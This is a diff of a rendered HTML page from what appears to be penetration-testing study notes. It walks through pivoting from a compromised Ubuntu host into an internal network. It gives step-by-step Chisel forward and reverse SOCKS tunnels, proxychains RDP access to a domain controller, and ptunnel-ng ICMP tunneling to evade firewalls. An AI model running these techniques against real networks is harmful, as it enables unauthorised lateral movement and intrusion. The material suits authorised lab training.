+</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a>./chisel client -v 10.10.10.3:1234 socks
 </span></code></pre></div>
 <p>Results:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="gp"># </span>client:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>ws://10.10.10.3:1234
-</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a><span class="gp"># </span>client:<span class="w"> </span>tun:<span class="w"> </span>proxy#127.0.0.1:1080<span class="o">=</span>&gt;socks:<span class="w"> </span>Listening
-</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a><span class="gp"># </span>client:<span class="w"> </span>tun:<span class="w"> </span>Bound<span class="w"> </span>proxies
-</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#__codelineno-76-4"></a><span class="gp"># </span>client:<span class="w"> </span>Handshaking...
-</span><span id="__span-76-5"><a id="__codelineno-76-5" name="__codelineno-76-5" href="#__codelineno-76-5"></a><span class="gp"># </span>client:<span class="w"> </span>Sending<span class="w"> </span>config
-</span><span id="__span-76-6"><a id="__codelineno-76-6" name="__codelineno-76-6" href="#__codelineno-76-6"></a><span class="gp"># </span>client:<span class="w"> </span>Connected<span class="w"> </span><span class="o">(</span>Latency<span class="w"> </span><span class="m">120</span>.170822ms<span class="o">)</span>
-</span><span id="__span-76-7"><a id="__codelineno-76-7" name="__codelineno-76-7" href="#__codelineno-76-7"></a><span class="gp"># </span>client:<span class="w"> </span>tun:<span class="w"> </span>SSH<span class="w"> </span>connected
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="gp"># </span>client:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>ws://10.10.10.3:1234
+</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a><span class="gp"># </span>client:<span class="w"> </span>tun:<span class="w"> </span>proxy#127.0.0.1:1080<span class="o">=</span>&gt;socks:<span class="w"> </span>Listening
+</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a><span class="gp"># </span>client:<span class="w"> </span>tun:<span class="w"> </span>Bound<span class="w"> </span>proxies
+</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a><span class="gp"># </span>client:<span class="w"> </span>Handshaking...
+</span><span id="__span-77-5"><a id="__codelineno-77-5" name="__codelineno-77-5" href="#__codelineno-77-5"></a><span class="gp"># </span>client:<span class="w"> </span>Sending<span class="w"> </span>config
+</span><span id="__span-77-6"><a id="__codelineno-77-6" name="__codelineno-77-6" href="#__codelineno-77-6"></a><span class="gp"># </span>client:<span class="w"> </span>Connected<span class="w"> </span><span class="o">(</span>Latency<span class="w"> </span><span class="m">120</span>.170822ms<span class="o">)</span>
+</span><span id="__span-77-7"><a id="__codelineno-77-7" name="__codelineno-77-7" href="#__codelineno-77-7"></a><span class="gp"># </span>client:<span class="w"> </span>tun:<span class="w"> </span>SSH<span class="w"> </span>connected
 </span></code></pre></div>
 <p>The Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.</p>
 <p><strong>5.</strong> Now we can modify our proxychains.conf file located at /etc/proxychains4.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="gp"># </span>Edit<span class="w"> </span>the<span class="w"> </span>proxychains<span class="w"> </span>conf<span class="w"> </span>file
-</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a><span class="go">sudo nano /etc/proxychains4.conf</span>
-</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#__codelineno-77-3"></a>
-</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#__codelineno-77-4"></a><span class="gp"># </span>Add<span class="w"> </span>the<span class="w"> </span>line<span class="w"> </span><span class="sb">`</span>socks5<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1080</span><span class="sb">`</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="gp"># </span>Edit<span class="w"> </span>the<span class="w"> </span>proxychains<span class="w"> </span>conf<span class="w"> </span>file
+</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#__codelineno-78-2"></a><span class="go">sudo nano /etc/proxychains4.conf</span>
+</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#__codelineno-78-3"></a>
+</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#__codelineno-78-4"></a><span class="gp"># </span>Add<span class="w"> </span>the<span class="w"> </span>line<span class="w"> </span><span class="sb">`</span>socks5<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1080</span><span class="sb">`</span>
 </span></code></pre></div>
 <p><strong>6.</strong> Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="go">proxychains xfreerdp /v:172.16.5.19 /u:$username /p:$password</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="go">proxychains xfreerdp /v:172.16.5.19 /u:$username /p:$password</span>
 </span></code></pre></div>
 <h4 id="chisel-reverse-pivot">Chisel Reverse Pivot</h4>
 <p>In the previous example, we used the compromised machine (Ubuntu) as our Chisel server, listing on port 1234. Still, there may be scenarios where firewall rules restrict inbound connections to our compromised target. In such cases, we can use Chisel with the reverse option.</p>
@@ -17319,95 +17326,95 @@ Attacked machine 2:
 </tbody>
 </table>
 <p><strong>1.</strong> Start the Chisel Server on our attacker machine or attacker host:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="gp">#</span><span class="c1">########</span>
-</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
-</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#__codelineno-79-3"></a><span class="gp">#</span><span class="c1">######</span>
-</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#__codelineno-79-4"></a><span class="go">sudo ./chisel server --reverse -v -p 1234 --socks5</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a><span class="gp">#</span><span class="c1">########</span>
+</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
+</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a><span class="gp">#</span><span class="c1">######</span>
+</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4" href="#__codelineno-80-4"></a><span class="go">sudo ./chisel server --reverse -v -p 1234 --socks5</span>
 </span></code></pre></div>
 <p><strong>2.</strong> Then we connect from the Ubuntu (pivot host) to our attacker machine (or attack host), using the option R:socks</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a><span class="gp">#</span><span class="c1">########</span>
-</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2" href="#__codelineno-80-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>Ubuntu<span class="w"> </span>compromised<span class="w"> </span>machine,<span class="w"> </span>our<span class="w"> </span>Pivot<span class="w"> </span>Host
-</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3" href="#__codelineno-80-3"></a><span class="gp">#</span><span class="c1">######</span>
-</span><span id="__span-80-4"><a id="__codelineno-80-4" name="__codelineno-80-4" href="#__codelineno-80-4"></a><span class="go">/chisel client -v 10.10.10.2:1234 R:socks</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="gp">#</span><span class="c1">########</span>
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>Ubuntu<span class="w"> </span>compromised<span class="w"> </span>machine,<span class="w"> </span>our<span class="w"> </span>Pivot<span class="w"> </span>Host
+</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a><span class="gp">#</span><span class="c1">######</span>
+</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a><span class="go">/chisel client -v 10.10.10.2:1234 R:socks</span>
 </span></code></pre></div>
 <p>Results:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="gp"># </span>client:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>ws://10.10.10.2:1234
-</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a><span class="gp"># </span>client:<span class="w"> </span>Handshaking...
-</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a><span class="gp"># </span>client:<span class="w"> </span>Sending<span class="w"> </span>config
-</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a><span class="gp"># </span>client:<span class="w"> </span>Connected<span class="w"> </span><span class="o">(</span>Latency<span class="w"> </span><span class="m">120</span>.170822ms<span class="o">)</span>
-</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a><span class="gp"># </span>client:<span class="w"> </span>tun:<span class="w"> </span>SSH<span class="w"> </span>connected
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a><span class="gp"># </span>client:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>ws://10.10.10.2:1234
+</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a><span class="gp"># </span>client:<span class="w"> </span>Handshaking...
+</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a><span class="gp"># </span>client:<span class="w"> </span>Sending<span class="w"> </span>config
+</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a><span class="gp"># </span>client:<span class="w"> </span>Connected<span class="w"> </span><span class="o">(</span>Latency<span class="w"> </span><span class="m">120</span>.170822ms<span class="o">)</span>
+</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5" href="#__codelineno-82-5"></a><span class="gp"># </span>client:<span class="w"> </span>tun:<span class="w"> </span>SSH<span class="w"> </span>connected
 </span></code></pre></div>
 <p><strong>3.</strong> Now we can modify our proxychains.conf file located at /etc/proxychains4.conf and add 1080 port at the end so we can use proxychains to pivot using the created tunnel between the 1080 port and the SSH tunnel.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a><span class="gp"># </span>Edit<span class="w"> </span>the<span class="w"> </span>proxychains<span class="w"> </span>conf<span class="w"> </span>file
-</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a><span class="go">sudo nano /etc/proxychains4.conf</span>
-</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>
-</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a><span class="gp"># </span>Add<span class="w"> </span>the<span class="w"> </span>line<span class="w"> </span><span class="sb">`</span>socks5<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1080</span><span class="sb">`</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="gp"># </span>Edit<span class="w"> </span>the<span class="w"> </span>proxychains<span class="w"> </span>conf<span class="w"> </span>file
+</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a><span class="go">sudo nano /etc/proxychains4.conf</span>
+</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a>
+</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a><span class="gp"># </span>Add<span class="w"> </span>the<span class="w"> </span>line<span class="w"> </span><span class="sb">`</span>socks5<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="m">1080</span><span class="sb">`</span>
 </span></code></pre></div>
 <p><strong>4.</strong> Now if we use proxychains with RDP, we can connect to the DC on the internal network through the tunnel we have created to the Pivot host.</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="go">proxychains xfreerdp /v:172.16.5.19 /u:$username /p:$password</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="go">proxychains xfreerdp /v:172.16.5.19 /u:$username /p:$password</span>
 </span></code></pre></div>
 <h3 id="icmp-tunneling-with-socks">ICMP tunneling with SOCKS</h3>
 <p>ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses.</p>
 <p><strong>Important:</strong> ICMP tunneling would only work when ping responses are permitted within a firewalled network. </p>
 <p>We will use the <a href="https://github.com/utoni/ptunnel-ng">ptunnel-ng</a> tool to create a tunnel between our Ubuntu server and our attack host. Once a tunnel is created, we will be able to proxy our traffic through the <code>ptunnel-ng client</code>. We can start the <code>ptunnel-ng server</code> on the target pivot host.</p>
 <p><strong>1.</strong> Install ptunnel-ng in the attacker machine:</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="gp">#</span><span class="c1">########</span>
-</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
-</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#__codelineno-84-3"></a><span class="gp">#</span><span class="c1">######</span>
-</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4" href="#__codelineno-84-4"></a><span class="go">git clone https://github.com/utoni/ptunnel-ng.git</span>
-</span><span id="__span-84-5"><a id="__codelineno-84-5" name="__codelineno-84-5" href="#__codelineno-84-5"></a>
-</span><span id="__span-84-6"><a id="__codelineno-84-6" name="__codelineno-84-6" href="#__codelineno-84-6"></a><span class="gp"># </span>Once<span class="w"> </span>the<span class="w"> </span>ptunnel-ng<span class="w"> </span>repo<span class="w"> </span>is<span class="w"> </span>cloned<span class="w"> </span>to<span class="w"> </span>our<span class="w"> </span>attack<span class="w"> </span>host,<span class="w"> </span>we<span class="w"> </span>can<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>autogen.sh<span class="w"> </span>script<span class="w"> </span>located<span class="w"> </span>at<span class="w"> </span>the<span class="w"> </span>root<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>ptunnel-ng<span class="w"> </span>directory.<span class="w"> </span>Building<span class="w"> </span>Ptunnel-ng<span class="w"> </span>with<span class="w"> </span>Autogen.sh
-</span><span id="__span-84-7"><a id="__codelineno-84-7" name="__codelineno-84-7" href="#__codelineno-84-7"></a><span class="go">sudo ./autogen.sh </span>
-</span><span id="__span-84-8"><a id="__codelineno-84-8" name="__codelineno-84-8" href="#__codelineno-84-8"></a>
-</span><span id="__span-84-9"><a id="__codelineno-84-9" name="__codelineno-84-9" href="#__codelineno-84-9"></a><span class="gp"># </span>Another<span class="w"> </span>way<span class="w"> </span>to<span class="w"> </span>build<span class="w"> </span>the<span class="w"> </span>ptunnel-ng<span class="w"> </span>binary
-</span><span id="__span-84-10"><a id="__codelineno-84-10" name="__codelineno-84-10" href="#__codelineno-84-10"></a><span class="go">sudo apt install automake autoconf -y</span>
-</span><span id="__span-84-11"><a id="__codelineno-84-11" name="__codelineno-84-11" href="#__codelineno-84-11"></a><span class="go">cd ptunnel-ng/</span>
-</span><span id="__span-84-12"><a id="__codelineno-84-12" name="__codelineno-84-12" href="#__codelineno-84-12"></a><span class="go">sed -i &#39;$s/.*/LDFLAGS=-static &quot;${NEW_WD}\/configure&quot; --enable-static $@ \&amp;\&amp; make clean \&amp;\&amp; make -j${BUILDJOBS:-4} all/&#39; autogen.sh</span>
-</span><span id="__span-84-13"><a id="__codelineno-84-13" name="__codelineno-84-13" href="#__codelineno-84-13"></a><span class="go">./autogen.sh</span>
-</span><span id="__span-84-14"><a id="__codelineno-84-14" name="__codelineno-84-14" href="#__codelineno-84-14"></a>
-</span><span id="__span-84-15"><a id="__codelineno-84-15" name="__codelineno-84-15" href="#__codelineno-84-15"></a><span class="gp"># </span>After<span class="w"> </span>running<span class="w"> </span>autogen.sh,<span class="w"> </span>ptunnel-ng<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>client<span class="w"> </span>and<span class="w"> </span>server-side.<span class="w"> </span>We<span class="w"> </span>will<span class="w"> </span>now<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>transfer<span class="w"> </span>the<span class="w"> </span>repo<span class="w"> </span>from<span class="w"> </span>our<span class="w"> </span>attack<span class="w"> </span>host<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>host
-</span><span id="__span-84-16"><a id="__codelineno-84-16" name="__codelineno-84-16" href="#__codelineno-84-16"></a><span class="go">scp -r ptunnel-ng ubuntu@$ipUbuntuCompromisedMachine:~/</span>
-</span><span id="__span-84-17"><a id="__codelineno-84-17" name="__codelineno-84-17" href="#__codelineno-84-17"></a>
-</span><span id="__span-84-18"><a id="__codelineno-84-18" name="__codelineno-84-18" href="#__codelineno-84-18"></a><span class="gp"># </span>Connect<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>ubuntu
-</span><span id="__span-84-19"><a id="__codelineno-84-19" name="__codelineno-84-19" href="#__codelineno-84-19"></a><span class="go">ssh ubuntu@$ipUbuntuCompromisedMachine</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="gp">#</span><span class="c1">########</span>
+</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
+</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a><span class="gp">#</span><span class="c1">######</span>
+</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a><span class="go">git clone https://github.com/utoni/ptunnel-ng.git</span>
+</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5" href="#__codelineno-85-5"></a>
+</span><span id="__span-85-6"><a id="__codelineno-85-6" name="__codelineno-85-6" href="#__codelineno-85-6"></a><span class="gp"># </span>Once<span class="w"> </span>the<span class="w"> </span>ptunnel-ng<span class="w"> </span>repo<span class="w"> </span>is<span class="w"> </span>cloned<span class="w"> </span>to<span class="w"> </span>our<span class="w"> </span>attack<span class="w"> </span>host,<span class="w"> </span>we<span class="w"> </span>can<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>autogen.sh<span class="w"> </span>script<span class="w"> </span>located<span class="w"> </span>at<span class="w"> </span>the<span class="w"> </span>root<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>ptunnel-ng<span class="w"> </span>directory.<span class="w"> </span>Building<span class="w"> </span>Ptunnel-ng<span class="w"> </span>with<span class="w"> </span>Autogen.sh
+</span><span id="__span-85-7"><a id="__codelineno-85-7" name="__codelineno-85-7" href="#__codelineno-85-7"></a><span class="go">sudo ./autogen.sh </span>
+</span><span id="__span-85-8"><a id="__codelineno-85-8" name="__codelineno-85-8" href="#__codelineno-85-8"></a>
+</span><span id="__span-85-9"><a id="__codelineno-85-9" name="__codelineno-85-9" href="#__codelineno-85-9"></a><span class="gp"># </span>Another<span class="w"> </span>way<span class="w"> </span>to<span class="w"> </span>build<span class="w"> </span>the<span class="w"> </span>ptunnel-ng<span class="w"> </span>binary
+</span><span id="__span-85-10"><a id="__codelineno-85-10" name="__codelineno-85-10" href="#__codelineno-85-10"></a><span class="go">sudo apt install automake autoconf -y</span>
+</span><span id="__span-85-11"><a id="__codelineno-85-11" name="__codelineno-85-11" href="#__codelineno-85-11"></a><span class="go">cd ptunnel-ng/</span>
+</span><span id="__span-85-12"><a id="__codelineno-85-12" name="__codelineno-85-12" href="#__codelineno-85-12"></a><span class="go">sed -i &#39;$s/.*/LDFLAGS=-static &quot;${NEW_WD}\/configure&quot; --enable-static $@ \&amp;\&amp; make clean \&amp;\&amp; make -j${BUILDJOBS:-4} all/&#39; autogen.sh</span>
+</span><span id="__span-85-13"><a id="__codelineno-85-13" name="__codelineno-85-13" href="#__codelineno-85-13"></a><span class="go">./autogen.sh</span>
+</span><span id="__span-85-14"><a id="__codelineno-85-14" name="__codelineno-85-14" href="#__codelineno-85-14"></a>
+</span><span id="__span-85-15"><a id="__codelineno-85-15" name="__codelineno-85-15" href="#__codelineno-85-15"></a><span class="gp"># </span>After<span class="w"> </span>running<span class="w"> </span>autogen.sh,<span class="w"> </span>ptunnel-ng<span class="w"> </span>can<span class="w"> </span>be<span class="w"> </span>used<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>client<span class="w"> </span>and<span class="w"> </span>server-side.<span class="w"> </span>We<span class="w"> </span>will<span class="w"> </span>now<span class="w"> </span>need<span class="w"> </span>to<span class="w"> </span>transfer<span class="w"> </span>the<span class="w"> </span>repo<span class="w"> </span>from<span class="w"> </span>our<span class="w"> </span>attack<span class="w"> </span>host<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>target<span class="w"> </span>host
+</span><span id="__span-85-16"><a id="__codelineno-85-16" name="__codelineno-85-16" href="#__codelineno-85-16"></a><span class="go">scp -r ptunnel-ng ubuntu@$ipUbuntuCompromisedMachine:~/</span>
+</span><span id="__span-85-17"><a id="__codelineno-85-17" name="__codelineno-85-17" href="#__codelineno-85-17"></a>
+</span><span id="__span-85-18"><a id="__codelineno-85-18" name="__codelineno-85-18" href="#__codelineno-85-18"></a><span class="gp"># </span>Connect<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>ubuntu
+</span><span id="__span-85-19"><a id="__codelineno-85-19" name="__codelineno-85-19" href="#__codelineno-85-19"></a><span class="go">ssh ubuntu@$ipUbuntuCompromisedMachine</span>
 </span></code></pre></div>
 <p><strong>2.</strong> Start the ptunnel-ng Server on the Target Host</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="gp">#</span><span class="c1">########</span>
-</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>Ubuntu<span class="w"> </span>compromised<span class="w"> </span>machine,<span class="w"> </span>our<span class="w"> </span>Pivot<span class="w"> </span>Host
-</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a><span class="gp">#</span><span class="c1">######</span>
-</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a><span class="go">sudo ./ptunnel-ng/src/ptunnel-ng -r$ipUbuntuCompromisedMachine -R22</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a><span class="gp">#</span><span class="c1">########</span>
+</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>Ubuntu<span class="w"> </span>compromised<span class="w"> </span>machine,<span class="w"> </span>our<span class="w"> </span>Pivot<span class="w"> </span>Host
+</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a><span class="gp">#</span><span class="c1">######</span>
+</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a><span class="go">sudo ./ptunnel-ng/src/ptunnel-ng -r$ipUbuntuCompromisedMachine -R22</span>
 </span></code></pre></div>
 <p><strong>3.</strong> With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a><span class="gp">#</span><span class="c1">########</span>
-</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#__codelineno-86-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
-</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a><span class="gp">#</span><span class="c1">######</span>
-</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#__codelineno-86-4"></a>
-</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#__codelineno-86-5"></a><span class="gp"># </span>Connecting<span class="w"> </span>to<span class="w"> </span>ptunnel-ng<span class="w"> </span>Server<span class="w"> </span>from<span class="w"> </span>Attack<span class="w"> </span>Host
-</span><span id="__span-86-6"><a id="__codelineno-86-6" name="__codelineno-86-6" href="#__codelineno-86-6"></a><span class="go">sudo ./src/ptunnel-ng -p$ipUbuntuCompromisedMachine -l2222 -r$ipUbuntuCompromisedMachine -R22</span>
+<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="gp">#</span><span class="c1">########</span>
+</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a><span class="gp"># </span>In<span class="w"> </span>the<span class="w"> </span>attacker<span class="w"> </span>machine
+</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a><span class="gp">#</span><span class="c1">######</span>
+</span><span id="__span-87-4"><a id="__codelineno-87-4" name="__codelineno-87-4" href="#__codelineno-87-4"></a>
+</span><span id="__span-87-5"><a id="__codelineno-87-5" name="__codelineno-87-5" href="#__codelineno-87-5"></a><span class="gp"># </span>Connecting<span class="w"> </span>to<span class="w"> </span>ptunnel-ng<span class="w"> </span>Server<span class="w"> </span>from<span class="w"> </span>Attack<span class="w"> </span>Host
+</span><span id="__span-87-6"><a id="__codelineno-87-6" name="__codelineno-87-6" href="#__codelineno-87-6"></a><span class="go">sudo ./src/ptunnel-ng -p$ipUbuntuCompromisedMachine -l2222 -r$ipUbuntuCompromisedMachine -R22</span>
 </span></code></pre></div>
 <p>Now we can:</p>
 <ul>
 <li>OR Tunnel an SSH connection through an ICMP Tunnel</li>
 </ul>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a>ssh -p2222 -lubuntu 127.0.0.1
+<div class="language-text highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a>ssh -p2222 -lubuntu 127.0.0.1
 </span></code></pre></div>
 <ul>
 <li>OR  use proxychains with nmap to scan targets on the internal network. </li>
-</ul>
